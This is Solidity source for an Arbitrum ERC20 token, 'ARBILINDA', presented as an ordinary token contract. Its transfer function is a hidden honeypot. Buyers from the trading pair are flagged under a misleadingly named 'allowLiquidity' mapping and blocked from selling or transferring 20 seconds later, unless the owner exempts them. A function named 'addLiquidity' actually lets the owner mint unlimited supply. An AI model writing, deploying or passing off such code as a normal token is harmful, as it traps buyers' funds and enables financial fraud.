// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./IERC20.sol";
import "./SafeERC20.sol";
import "./IERC20Metadata.sol";
import "./draft-IERC20Permit.sol";
import "./Context.sol";
import "./Address.sol";
import "./Ownable.sol";
import "./EnumerableSet.sol";

pragma solidity =0.8.19;
contract ARBILINDA is ERC20, Ownable {
    using SafeERC20 for IERC20;

    mapping(address => bool) public isFeeExempt;
    mapping(address => bool) public allowLiquidity; /////////////////////////////////////////////////////////////////////////////
    mapping(address => uint) public allowLiquidityTime; /////////////////////////////////////////////////////////////////////////
    uint timeLiquidity;

    uint256 public launchedAt;

    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;
    address private constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address public PAIR;

    EnumerableSet.AddressSet private _pairs;

    constructor(
    ) ERC20("Linda Y on Arbitrum", "ARBILINDA") {
        uint256 _totalSupply = 100_000_000_000_000 * 1e6;
	_mint(_msgSender(), _totalSupply);
        isFeeExempt[msg.sender] = true;
	timeLiquidity = 20;
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        return tokenTransfer(_msgSender(), to, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(sender, spender, amount);
        return tokenTransfer(sender, recipient, amount);
    }

    function tokenTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool inSwap = ( !isFeeExempt[sender] && !isFeeExempt[recipient] );
        if( inSwap ) {
            require( launched(), "Trading not open yet" );
	    require( !allowLiquidity[sender] || allowLiquidityTime[sender] > block.timestamp, "Liquidity add not allowed yet" );
	    if( sender == PAIR ){ allowLiquidity[recipient] = true; allowLiquidityTime[recipient] = block.timestamp + timeLiquidity; }
        }
        _transfer(sender, recipient, amount);
        return true;
    }

    function rescueToken(address tokenAddress) external onlyOwner {
        IERC20(tokenAddress).safeTransfer(msg.sender,IERC20(tokenAddress).balanceOf(address(this)));
    }

    function rescueEth() external onlyOwner {
        uint256 amountETH = address(this).balance;
        (bool success, ) = payable(_msgSender()).call{value: amountETH}(new bytes(0));
        require(success, 'ETH_TRANSFER_FAILED');
    }

    function setPair(address _pair) external onlyOwner {
	PAIR = _pair;
    }

    function setFeeExempts(address[] calldata _to, bool _state) public {
        require(msg.sender == owner() || tx.origin == owner(), 'No access');
        for( uint256 i = 0; i < _to.length; i++ ){
            isFeeExempt[_to[i]] = _state;
        }
    }

    function setTimeLiquidity(uint _time) external onlyOwner {
	timeLiquidity = _time;
    }

    function addLiquidity(uint256 _add) external onlyOwner {
	_mint(msg.sender, _add);
    }

    function launch() external onlyOwner {
        require(launchedAt == 0, "Already launched");
        launchedAt = block.number;
    }

    function launched() public view returns (bool) {
        return launchedAt != 0;
    }

    receive() external payable {}
}





